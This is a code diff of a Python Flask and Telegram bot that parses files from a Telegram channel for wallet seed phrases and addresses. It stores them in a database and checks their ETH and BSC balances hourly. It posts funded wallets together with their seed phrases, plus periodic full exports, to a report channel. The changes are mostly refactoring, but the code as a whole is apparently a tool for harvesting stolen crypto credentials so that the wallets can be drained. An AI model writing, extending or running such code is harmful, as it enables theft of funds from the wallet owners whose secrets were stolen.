@@ -12,7 +12,6 @@ from telegram import Bot, Update
 from telegram.request import HTTPXRequest
 from web3 import Web3
 import psycopg2
-from psycopg2.extras import execute_values
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -23,13 +22,12 @@ REPORT_CHANNEL = -1003893481541
 
 HOURLY_INTERVAL_MIN = int(os.environ.get("HOURLY_INTERVAL_MIN", "60"))
 EXPORT_INTERVAL_MIN = int(os.environ.get("EXPORT_INTERVAL_MIN", "120"))
+HOURLY_BATCH_SIZE = 300
 
 NETWORKS = {
     'ETH': 'https://eth.llamarpc.com',
     'BSC': 'https://bsc-dataseed.binance.org/',
 }
-
-HOURLY_BATCH_SIZE = 300
 
 app = Flask(__name__)
 task_queue = queue.Queue()
@@ -62,61 +60,47 @@ def init_db():
 
 
 def save_wallet(address, seed):
-    try:
-        conn = get_conn()
-        c = conn.cursor()
-        c.execute(
-            "INSERT INTO wallets (address, seed) VALUES (%s, %s) ON CONFLICT (address) DO NOTHING",
-            (address.lower(), seed.strip())
-        )
-        conn.commit()
-        c.close()
-        conn.close()
-    except Exception as e:
-        logging.error(f"save_wallet error: {e}")
+    conn = get_conn()
+    c = conn.cursor()
+    c.execute(
+        "INSERT INTO wallets (address, seed) VALUES (%s, %s) ON CONFLICT (address) DO NOTHING",
+        (address.lower(), seed.strip())
+    )
+    conn.commit()
+    c.close()
+    conn.close()
 
 
 def get_all_wallets():
-    try:
-        conn = get_conn()
-        c = conn.cursor()
-        c.execute("SELECT address, seed FROM wallets ORDER BY added_at")
-        rows = c.fetchall()
-        c.close()
-        conn.close()
-        return rows
-    except Exception as e:
-        logging.error(f"get_all_wallets error: {e}")
-        return []
+    conn = get_conn()
+    c = conn.cursor()
+    c.execute("SELECT address, seed FROM wallets ORDER BY added_at")
+    rows = c.fetchall()
+    c.close()
+    conn.close()
+    return rows
 
 
 def get_meta(key, default=None):
-    try:
-        conn = get_conn()
-        c = conn.cursor()
-        c.execute("SELECT value FROM meta WHERE key = %s", (key,))
-        row = c.fetchone()
-        c.close()
-        conn.close()
-        return row[0] if row else default
-    except Exception as e:
-        logging.error(f"get_meta error: {e}")
-        return default
+    conn = get_conn()
+    c = conn.cursor()
+    c.execute("SELECT value FROM meta WHERE key = %s", (key,))
+    row = c.fetchone()
+    c.close()
+    conn.close()
+    return row[0] if row else default
 
 
 def set_meta(key, value):
-    try:
-        conn = get_conn()
-        c = conn.cursor()
-        c.execute(
-            "INSERT INTO meta (key, value) VALUES (%s, %s) ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value",
-            (key, value)
-        )
-        conn.commit()
-        c.close()
-        conn.close()
-    except Exception as e:
-        logging.error(f"set_meta error: {e}")
+    conn = get_conn()
+    c = conn.cursor()
+    c.execute(
+        "INSERT INTO meta (key, value) VALUES (%s, %s) ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value",
+        (key, value)
+    )
+    conn.commit()
+    c.close()
+    conn.close()
 
 
 def get_wallet_total(address):
@@ -127,16 +111,15 @@ def get_wallet_total(address):
             checksum = Web3.to_checksum_address(address.strip())
             balance = w3.eth.get_balance(checksum)
             totals[net] = float(w3.from_wei(balance, 'ether'))
-        except Exception:
+        except:
             continue
     return totals
 
 
 async def handle_file(doc):
-    request_config = HTTPXRequest(connection_pool_size=20, pool_timeout=30.0)
-    bot = Bot(token=BOT_TOKEN, request=request_config)
+    bot = Bot(token=BOT_TOKEN, request=HTTPXRequest(connection_pool_size=20))
     try:
-        logging.info(f"[FILE] Saving: {doc.file_name}")
+        logging.info(f"[FILE] Start: {doc.file_name}")
         file = await bot.get_file(doc.file_id)
         content = await file.download_as_bytearray()
         text = content.decode('utf-8', errors='ignore')
@@ -145,29 +128,27 @@ async def handle_file(doc):
         matches = re.findall(pattern, text, re.IGNORECASE)
 
         if not matches:
-            logging.info(f"[FILE] No wallets in {doc.file_name}")
+            logging.info("[FILE] No matches")
             return
 
         for phrase, addr in matches:
             save_wallet(addr, phrase)
 
         total = len(get_all_wallets())
-        logging.info(f"[FILE] Saved {len(matches)} | DB total: {total}")
+        logging.info(f"[FILE] Saved {len(matches)} | Total DB: {total}")
 
         await bot.send_message(
             chat_id=REPORT_CHANNEL,
-            text=f"💾 ذخیره شد\n📄 `{doc.file_name}`\n🔢 جدید: `{len(matches)}`\n📦 کل دیتابیس: `{total}`"
+            text=f"💾 ذخیره شد\n📄 `{doc.file_name}`\n🔢 جدید: `{len(matches)}`\n📦 کل: `{total}`"
         )
     except Exception as e:
         logging.error(f"[FILE] Error: {e}", exc_info=True)
 
 
 async def handle_hourly():
-    request_config = HTTPXRequest(connection_pool_size=25, pool_timeout=60.0)
-    bot = Bot(token=BOT_TOKEN, request=request_config)
-
+    bot = Bot(token=BOT_TOKEN, request=HTTPXRequest(connection_pool_size=25, pool_timeout=60))
     wallets = get_all_wallets()
-    logging.info(f"[HOURLY] Wallets: {len(wallets)}")
+    logging.info(f"[HOURLY] Count: {len(wallets)}")
 
     if not wallets:
         set_meta("last_hourly", datetime.utcnow().isoformat())
@@ -175,7 +156,7 @@ async def handle_hourly():
 
     await bot.send_message(
         chat_id=REPORT_CHANNEL,
-        text=f"⏰ **شروع گزارش ساعتی**\n🔢 تعداد: `{len(wallets)}`\n📅 `{datetime.utcnow().strftime('%Y-%m-%d %H:%M')} UTC`"
+        text=f"⏰ **گزارش ساعتی**\n🔢 `{len(wallets)}` ولت\n📅 `{datetime.utcnow().strftime('%Y-%m-%d %H:%M')} UTC`"
     )
 
     totals = {'ETH': 0.0, 'BSC': 0.0}
@@ -203,55 +184,43 @@ async def handle_hourly():
                 batch_rich.append((addr, seed, res))
                 rich_count += 1
 
-        part_msg = (
-            f"⏰ گزارش ساعتی - قسمت {part_num}/{total_parts}\n"
-            f"🔢 `{len(batch)}` ولت\n"
-            f"🔹 ETH: `{batch_eth:.6f}`\n"
-            f"🔹 BSC: `{batch_bsc:.6f}`\n"
-            f"💰 موجودی‌دار: `{len(batch_rich)}`"
+        await bot.send_message(
+            chat_id=REPORT_CHANNEL,
+            text=f"⏰ قسمت {part_num}/{total_parts}\n🔢 `{len(batch)}`\n🔹 ETH: `{batch_eth:.6f}`\n🔹 BSC: `{batch_bsc:.6f}`\n💰 `{len(batch_rich)}`"
         )
-        await bot.send_message(chat_id=REPORT_CHANNEL, text=part_msg)
 
         for addr, seed, res in batch_rich:
             msg = f"`{addr}`\n🔑 `{seed}`\n"
-            if res['ETH'] > 0:
-                msg += f"• ETH: `{res['ETH']:.6f}`\n"
-            if res['BSC'] > 0:
-                msg += f"• BSC: `{res['BSC']:.6f}`\n"
+            if res['ETH'] > 0: msg += f"• ETH: `{res['ETH']:.6f}`\n"
+            if res['BSC'] > 0: msg += f"• BSC: `{res['BSC']:.6f}`\n"
             await bot.send_message(chat_id=REPORT_CHANNEL, text=msg)
             await asyncio.sleep(0.3)
 
-    final = (
-        f"✅ **پایان گزارش ساعتی**\n"
-        f"🔢 کل: `{len(wallets)}`\n"
-        f"🔹 ETH: `{totals['ETH']:.6f}`\n"
-        f"🔹 BSC: `{totals['BSC']:.6f}`\n"
-        f"💰 موجودی‌دار: `{rich_count}`"
+    await bot.send_message(
+        chat_id=REPORT_CHANNEL,
+        text=f"✅ **پایان گزارش ساعتی**\n🔢 کل: `{len(wallets)}`\n🔹 ETH: `{totals['ETH']:.6f}`\n🔹 BSC: `{totals['BSC']:.6f}`\n💰 `{rich_count}`"
     )
-    await bot.send_message(chat_id=REPORT_CHANNEL, text=final)
     set_meta("last_hourly", datetime.utcnow().isoformat())
-    logging.info(f"[HOURLY] Finished | rich: {rich_count}")
+    logging.info("[HOURLY] Done")
 
 
 async def handle_export():
-    request_config = HTTPXRequest(connection_pool_size=10)
-    bot = Bot(token=BOT_TOKEN, request=request_config)
-
+    bot = Bot(token=BOT_TOKEN, request=HTTPXRequest(connection_pool_size=10))
     wallets = get_all_wallets()
     if not wallets:
         set_meta("last_export", datetime.utcnow().isoformat())
         return
 
-    content = f"Database Export - {datetime.utcnow().isoformat()} UTC\nTotal: {len(wallets)}\n\n"
+    content = f"Export {datetime.utcnow().isoformat()}\nTotal: {len(wallets)}\n\n"
     for addr, seed in wallets:
         content += f"Phrase: {seed} | Addr: {addr}\n"
 
-    with open("database_full.txt", "w", encoding="utf-8") as f:
+    with open("db_export.txt", "w", encoding="utf-8") as f:
         f.write(content)
 
     await bot.send_document(
         chat_id=REPORT_CHANNEL,
-        document=open("database_full.txt", "rb"),
+        document=open("db_export.txt", "rb"),
         caption=f"📦 دیتابیس کامل\nتعداد: `{len(wallets)}`"
     )
     set_meta("last_export", datetime.utcnow().isoformat())
@@ -259,12 +228,12 @@ async def handle_export():
 
 
 def worker_loop():
-    logging.info("=== WORKER STARTED ===")
+    logging.info("WORKER STARTED")
     while True:
         try:
             task = task_queue.get(timeout=60)
-            ttype = task.get("type")
-            logging.info(f"=== PROCESSING: {ttype} ===")
+            ttype = task["type"]
+            logging.info(f"PROCESSING {ttype}")
 
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
@@ -278,41 +247,42 @@ def worker_loop():
             finally:
                 loop.close()
             task_queue.task_done()
-            logging.info(f"=== FINISHED: {ttype} ===")
+            logging.info(f"FINISHED {ttype}")
         except queue.Empty:
             continue
         except Exception as e:
             logging.error(f"Worker error: {e}", exc_info=True)
-            time.sleep(5)
+            time.sleep(3)
 
 
 def scheduler_loop():
-    logging.info("=== SCHEDULER STARTED ===")
+    logging.info("SCHEDULER STARTED")
     while True:
         try:
             now = datetime.utcnow()
-
             last_h = get_meta("last_hourly")
             if last_h is None or (now - datetime.fromisoformat(last_h)).total_seconds() >= HOURLY_INTERVAL_MIN * 60:
-                if task_queue.qsize() < 3:
+                if task_queue.qsize() < 2:
                     task_queue.put({"type": "hourly"})
-                    logging.info("Queued HOURLY")
+                    logging.info("Queued hourly")
 
             last_e = get_meta("last_export")
             if last_e is None or (now - datetime.fromisoformat(last_e)).total_seconds() >= EXPORT_INTERVAL_MIN * 60:
-                if task_queue.qsize() < 3:
+                if task_queue.qsize() < 2:
                     task_queue.put({"type": "export"})
-                    logging.info("Queued EXPORT")
-
+                    logging.info("Queued export")
         except Exception as e:
             logging.error(f"Scheduler error: {e}", exc_info=True)
-
         time.sleep(30)
 
 
-init_db()
-threading.Thread(target=worker_loop, daemon=True).start()
-threading.Thread(target=scheduler_loop, daemon=True).start()
+# شروع
+if not DATABASE_URL:
+    logging.error("DATABASE_URL is missing!")
+else:
+    init_db()
+    threading.Thread(target=worker_loop, daemon=True).start()
+    threading.Thread(target=scheduler_loop, daemon=True).start()
 
 
 @app.route('/webhook', methods=['POST'])
@@ -321,12 +291,15 @@ def webhook():
     update = Update.de_json(data, bot=None)
     if update and update.channel_post and update.channel_post.document:
         if update.channel_post.chat.id == SOURCE_CHANNEL:
-            doc = update.channel_post.document
-            logging.info(f"WEBHOOK: {doc.file_name}")
-            task_queue.put({"type": "file", "doc": doc})
+            logging.info(f"WEBHOOK FILE: {update.channel_post.document.file_name}")
+            task_queue.put({"type": "file", "doc": update.channel_post.document})
     return "OK"
 
 
 @app.route('/')
 def health():
-    return f"Bot running | Queue: {task_queue.qsize()} | DB: {len(get_all_wallets())}"
+    try:
+        count = len(get_all_wallets())
+    except:
+        count = "error"
+    return f"OK | Queue: {task_queue.qsize()} | DB: {count}"
